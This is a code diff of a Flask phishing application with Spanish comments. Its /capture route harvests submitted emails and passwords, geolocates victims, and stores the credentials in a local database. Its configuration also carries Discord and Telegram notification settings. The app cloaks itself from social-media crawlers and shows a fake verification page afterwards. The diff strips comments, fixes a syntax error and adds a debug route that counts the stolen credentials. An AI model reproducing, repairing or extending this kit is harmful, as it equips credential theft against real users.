@@ -25,10 +25,8 @@ app.config.update(
     PERMANENT_SESSION_LIFETIME=timedelta(hours=2)
 )
 
-# Configurar CSRF
 csrf = CSRFProtect(app)
 
-# Config
 CONFIG = {
     'discord_webhook': None,
     'telegram_token': None,
@@ -41,22 +39,16 @@ CONFIG = {
     'cleanup_days': 30
 }
 
-# Diccionarios para rate limiting
 login_attempts = {}
 view_requests = {}
 root_requests = {}
-
-# Habilitar auditoría
 audit_log_enabled = True
 
 def audit_log(action, details, ip=None):
-    """Registra acciones importantes en un archivo de auditoría"""
     if not audit_log_enabled:
         return
-    
     if ip is None:
         ip = get_client_ip()
-    
     log_entry = {
         'timestamp': datetime.now().isoformat(),
         'action': action,
@@ -64,7 +56,6 @@ def audit_log(action, details, ip=None):
         'details': details,
         'authenticated': session.get('admin_logged', False)
     }
-    
     try:
         with open('audit.log', 'a') as f:
             f.write(json.dumps(log_entry) + '\n')
@@ -72,9 +63,7 @@ def audit_log(action, details, ip=None):
         logger.error(f"Error en audit log: {e}")
 
 def is_rate_limited(ip, storage, limit=10, window_seconds=60):
-    """Verifica rate limiting"""
     now = datetime.now()
-    
     if ip in storage:
         count, timestamp = storage[ip]
         if (now - timestamp).total_seconds() < window_seconds:
@@ -88,7 +77,6 @@ def is_rate_limited(ip, storage, limit=10, window_seconds=60):
     return False
 
 def is_ip_blocked(ip):
-    """Verifica si una IP está bloqueada y si ya pasó el tiempo de bloqueo"""
     if ip in login_attempts:
         attempts, block_time = login_attempts[ip]
         if attempts >= CONFIG.get('max_login_attempts', 5):
@@ -138,7 +126,6 @@ def init_db():
 def cleanup_old_credentials(days=None):
     if days is None:
         days = CONFIG.get('cleanup_days', 30)
-    
     try:
         conn = sqlite3.connect('credentials.db', check_same_thread=False)
         cursor = conn.cursor()
@@ -182,7 +169,6 @@ def validate_input(text):
     return True
 
 def validate_email(email):
-    """Validación más estricta de email"""
     pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
     return re.match(pattern, email) is not None
 
@@ -216,13 +202,10 @@ def send_notifications(data):
 
 @app.after_request
 def add_security_headers(response):
-    """Añadir headers de seguridad a todas las respuestas"""
     response.headers['X-Frame-Options'] = 'DENY'
     response.headers['X-Content-Type-Options'] = 'nosniff'
     response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
     response.headers['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
-    
-    # CSP para la página de login y captura
     if request.path == '/' or request.path == '/capture':
         response.headers['Content-Security-Policy'] = (
             "default-src 'self'; "
@@ -236,7 +219,6 @@ def add_security_headers(response):
 
 @app.before_request
 def limit_root_requests():
-    """Limitar peticiones a la raíz"""
     if request.path == '/':
         ip = get_client_ip()
         if is_rate_limited(ip, root_requests, limit=20, window_seconds=60):
@@ -247,7 +229,6 @@ def limit_root_requests():
 @app.before_request
 def handle_bots():
     ua = request.headers.get('User-Agent', '')
-    
     if is_social_crawler(ua) and request.path == '/':
         return render_template_string('''
 <!DOCTYPE html>
@@ -565,7 +546,6 @@ def index():
 def capture():
     ip = get_client_ip()
     
-    # Verificar honeypot
     if request.form.get('honeypot'):
         logger.warning(f"Bot detectado en IP {ip}")
         audit_log('BOT_DETECTED', {'ip': ip}, ip)
@@ -574,13 +554,11 @@ def capture():
     username = request.form.get('email', '') or request.form.get('username', '')
     password = request.form.get('password', '')
     
-    # Validar email
     if not validate_email(username):
         logger.warning(f"Email inválido desde {ip}: {username}")
         audit_log('INVALID_EMAIL', {'username': username, 'ip': ip}, ip)
         return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
     
-    # Validar que la contraseña no esté vacía
     if not password or len(password) < 4:
         logger.warning(f"Contraseña muy corta desde {ip}")
         audit_log('SHORT_PASSWORD', {'ip': ip}, ip)
@@ -588,7 +566,6 @@ def capture():
     
     geo = get_geo(ip)
     
-    # Validar entrada para prevenir inyecciones
     if not validate_input(username):
         logger.warning(f"Intento de inyección detectado desde {ip}")
         audit_log('INJECTION_ATTEMPT', {'username': username, 'ip': ip}, ip)
@@ -624,7 +601,6 @@ def capture():
     
     send_notifications(data)
     
-    # Redirigir con página de verificación (más realista)
     return render_template_string('''
 <!DOCTYPE html>
 <html>
@@ -676,7 +652,7 @@ def login_credenciales():
             </div>
         </body>
         </html>
-        ''', 429
+        ''', 429)
     
     if request.method == 'POST':
         password = request.form.get('password')
@@ -1044,10 +1020,22 @@ def get_credentials_count():
     except:
         return 0
 
+@app.route('/debug-credenciales')
+def debug_credenciales():
+    """Ruta temporal para verificar la base de datos"""
+    try:
+        conn = sqlite3.connect('credentials.db', check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('SELECT COUNT(*) FROM credentials')
+        count = cursor.fetchone()[0]
+        conn.close()
+        return f"📊 Total de credenciales: {count}"
+    except Exception as e:
+        return f"❌ Error: {e}"
+
 if __name__ == '__main__':
     load_config()
     init_db()
-    
     cleanup_old_credentials()
     
     port = int(os.environ.get('PORT', 8080))
